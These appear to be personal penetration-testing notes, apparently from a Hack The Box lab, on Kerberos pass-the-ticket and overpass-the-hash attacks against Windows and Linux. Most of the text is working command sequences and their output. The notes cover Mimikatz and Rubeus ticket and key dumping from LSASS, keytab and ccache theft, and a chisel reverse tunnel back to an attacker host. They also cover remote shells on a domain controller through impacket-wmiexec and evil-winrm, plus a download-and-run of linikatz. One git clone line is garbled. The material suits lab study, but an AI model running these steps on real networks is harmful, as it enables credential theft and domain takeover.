#windows/auth/pass-the-ticket
# #Kerberos
The Kerberos authentication system is ticket-based.
* `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system.
* `TGS - Ticket Granting Service` allow services to verify user's identity.

If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication
# Attack
Tickets are processed and stored by the [[LSASS]]
As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
#### #Mimikatz - export tickets
```cmd
mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
mimikatz # exit

dir *.kirbi

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```
The tickets that end with **$** correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an **@** that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`
#### #Rubeus - export tickets
```cmd
Rubeus.exe dump /nowrap

<snip>
```
## Pass the Key or OverPass the Hash
The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`
#### Mimikatz - Extract Kerberos Keys
```cmd
mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

<snip>
```
**Now that we have access to the AES256_HMAC (b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60) and RC4_HMAC (3f74aa8f08f712f09cd5177b5c1ce50f) keys** 
#### Mimikatz - Pass the Key or OverPass the Hash
```cmd
mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
#### Rubeus - Pass the Key or OverPass the Hash
```cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

```
https://github.com/GhostPack/Rubeus#example-over-pass-the-hash
## Pass the Ticket (PtT)
Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
#### Rubeus - Pass the Ticket
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.
#### Convert .kirbi to base64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
````
#### Pass base64
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
````
#### #Mimikatz - Pass the Ticket
```cmd
mimikatz.exe 

mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
## Pass The Ticket with PowerShell Remoting (Windows)
#### #Mimikatz - Pass the Ticket for Lateral Movement.
```cmd
mimikatz.exe

mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

mimikatz # exit

c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
```
### #Rubeus - PowerShell Remoting with Pass the Ticket
#### Create a Sacrificial Process with #Rubeus
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
#### #Rubeus - Pass the Ticket for Lateral Movement
```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

<snip>

[+] Ticket successfully imported!

c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
```

#linux/auth/pass-the-ticket
# Kerberos on Linux
In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files.
## Identifying Linux and Active Directory Integration
```bash
# realm - Check If Linux Machine is Domain Joined
realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins

# PS - Check if Linux Machine is Domain Joined
ps -ef | grep -i "winbind\|sssd"
```
In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)
## Finding Kerberos Tickets in Linux
```bash
find / -name *keytab* -ls 2>/dev/null

crontab -l

# find cache files
ls $KRB5CCNAME

# cache in envs
env | grep -i krb5

# in tmp files
ls -la /tmp
```
## Abusing KeyTab Files
### method 1
```bash
klist -k -t /opt/specialfiles/carlos.keytab 

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# check we have ticket
klist

# connect to SMB as carlos
smbclient //dc01/carlos -k -c ls

```
### method 2 - keytab extract
https://github.com/sosdave/KeyTabExtract
```bash
git https://github.com/sosdave/KeyTabExtract && clone KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```
Now we can crack hashes with [[hashcat]],  [[john]] or https://crackstation.net/
After we get password, log in:
```bash
su - carlos@inlanefreight.htb
```
## Abusing Keytab cache
```bash
ls -la /tmp
# identify group
id julio@inlanefreight.htb
uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)

# import the ccache file into our current session
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
# ensure we see ticket
klist
# connect to SMB with ticket
smbclient //dc01/C$ -k -c ls -no-pass
```
## Using Linux Attack Tools with Kerberos
```bash
# modify host file to 
cat /etc/hosts
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01

cat /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```
Connect to MS01:
```bash
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
Execute chisel from MS01:
```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```
Finally, we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.
## #Impacket with proxychain ans kerberos
```bash
proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```
## #evil-winrm
```bash
sudo apt-get install krb5-user -y

# Default Kerberos Version 5 realm
# INLANEFREIGHT.htb
# The Kerberos servers can be empty.
# Administrative Server for your Kerberos Realm
# DC01
```
In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
```bash
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```
## Using #evil-winrm  with Kerberos
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
...
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```
## Ticket convertor
If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. 
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
## Importing Converted Ticket into Windows Session with Rubeus
```cmd
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
<...>
dir \\dc01\julio
```
## Linikatz
https://github.com/CiscoCXSecurity/linikatz
It's like #Mimikatz for linux.
```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh

<...>
<ticket information>
<...>

```
